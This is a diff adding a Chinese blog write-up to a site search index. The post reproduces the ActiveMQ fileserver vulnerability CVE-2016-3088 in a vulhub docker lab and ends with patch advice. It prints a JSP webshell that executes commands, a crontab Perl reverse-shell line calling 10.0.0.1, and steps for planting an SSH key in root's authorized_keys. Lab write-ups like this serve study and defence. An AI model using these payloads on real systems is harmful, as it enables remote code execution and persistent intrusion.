@@ -64,4 +64,73 @@ c.访问web管理页面,读取消息,触发漏洞
         <category>activemq</category>
       </categories>
   </entry>
+  <entry>
+    <title>vulhub cve-2016-3088</title>
+    <url>/2022/04/06/vulhub-cve-2016-3088/</url>
+    <content><![CDATA[<p>一、介绍<br>1.1 简介</p>
+<p>ActiveMQ 是Apache的一款JAVA开源消息中间件，支持Java消息服务、集群、SpringFrameword等。属于消息队列组件。<br>    消息队列组件：分布式系统中的重要组件，主要解决应用耦合、异步消息、流量削峰等</p>
+<p>1.2 影响版本</p>
+<pre><code>    Apache ActiveMQ 5.x~5.14.0
+</code></pre>
+<span id="more"></span>
+<p>1.3 漏洞描述</p>
+<p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java 的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用。2016年4月14日，国外安全研究人员 Simon Zuckerbraun 曝光 Apache ActiveMQ Fileserver 存在多个安全漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码（CVE-2016-3088）。</p>
+<p>1.4 利用限制</p>
+<pre><code>a、ActiveMQ版本低于5.12.x
+b、需要弱密码登录
+</code></pre>
+<p>二、环境搭建</p>
+<p>vulhub 启动 activemq&#x2F;CVE-2016-3088&#x2F;环境</p>
+<pre><code>命令：docker-compose up -d
+</code></pre>
+<img src="/2022/04/06/vulhub-cve-2016-3088/1.png" class>
+
+<p>三、漏洞复现</p>
+<p>3.1 直接写入shell</p>
+<p>好处是方便，但是fileserver不解析jsp，admin和api都需要登录才能访问，所以需要结合弱密码漏洞</p>
+<p>首先探查当前系统路径,访问<a href="http://ip//admin/test/systemProperties.jsp">http://ip//admin/test/systemProperties.jsp</a>    </p>
+<img src="/2022/04/06/vulhub-cve-2016-3088/2.png" class>
+
+<p>PUT上传Jsp的Webshell到fileserver目录下</p>
+<pre><code>&lt;%@ page import=&quot;java.io.*&quot;%&gt;
+
+&lt;%
+    out.print(&quot;Cytosine Test&lt;br&gt;&quot;);
+
+    String strcmd = request.getParameter(&quot;cmd&quot;);
+     String line = null;
+
+    Process p = Runtime.getRuntime().exec(strcmd);
+    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+    while((line=br.readLine())!=null)&#123;
+    out.print(line+&quot;&lt;br&gt;&quot;); &#125;
+%&gt;
+</code></pre>
+<img src="/2022/04/06/vulhub-cve-2016-3088/3.png" class>
+
+<p>响应为204说明成功</p>
+<p>接下来MOVE并进行重新命名</p>
+<p>Destination: file:&#x2F;&#x2F; &#x2F;opt&#x2F;apache-activemq-5.11.1&#x2F;webapps&#x2F;admin&#x2F;shell.jsp</p>
+<img src="/2022/04/06/vulhub-cve-2016-3088/4.png" class>
+
+<p>执行命令</p>
+<img src="/2022/04/06/vulhub-cve-2016-3088/5.png" class>
+
+<p>3.2 crontab</p>
+<p>利用定时器，自动化弹shell；注意，换行一定要\n，不能是\r\n，否则crontab执行会失败；这里利用perl语言写的反弹到VPS上；</p>
+<pre><code>*/1 * * * * root /usr/bin/perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;
+##
+</code></pre>
+<p>操作步骤与3.1一致，设置监听，等一会即可获取结果</p>
+<p>四、漏洞利用（写入ssh）</p>
+<p>a、攻击者首先生成一个公钥<br>b、PUT上传公钥<br>c、MOVE移动公钥到&#x2F;root&#x2F;.ssh&#x2F;并重命名为authorized_keys<br>d、连接ssh</p>
+<p>五、修复建议</p>
+<p>a、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本；<br>b、通过移除 conf\jetty.xml 的以下配置来禁用 ActiveMQ Fileserver 功能；</p>
+]]></content>
+      <categories>
+        <category>vulhub</category>
+        <category>activemq</category>
+      </categories>
+  </entry>
 </search>
